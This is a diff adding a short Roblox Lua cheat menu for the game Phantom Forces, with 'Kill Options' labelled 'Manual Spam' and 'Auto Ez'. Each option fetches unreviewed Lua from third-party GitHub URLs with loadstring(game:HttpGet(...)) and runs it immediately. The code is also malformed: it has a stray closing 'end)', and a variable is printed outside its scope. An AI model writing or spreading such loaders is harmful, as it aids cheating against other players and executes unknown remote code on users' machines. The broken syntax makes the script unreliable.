@@ -1,0 +1,16 @@
+local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
+ 
+local PhantomForcesWindow = Library:NewWindow("Combat")
+ 
+local KillingCheats = PhantomForcesWindow:NewSection("Kill Options")
+ 
+KillingCheats:CreateButton("Manual Spam ", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/SlzAX17vGCub7iRKVmJid61Bg/main/KwKVzV5SgcFBd9fnpLr4lKCg6.lua"))()
+print("FRIEZ ON TOP")
+end)
+ 
+KillingCheats:CreateToggle("Auto Ez", function(value)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KITLER-R/Father/main/France"))()
+end)
+print(value)
+end)
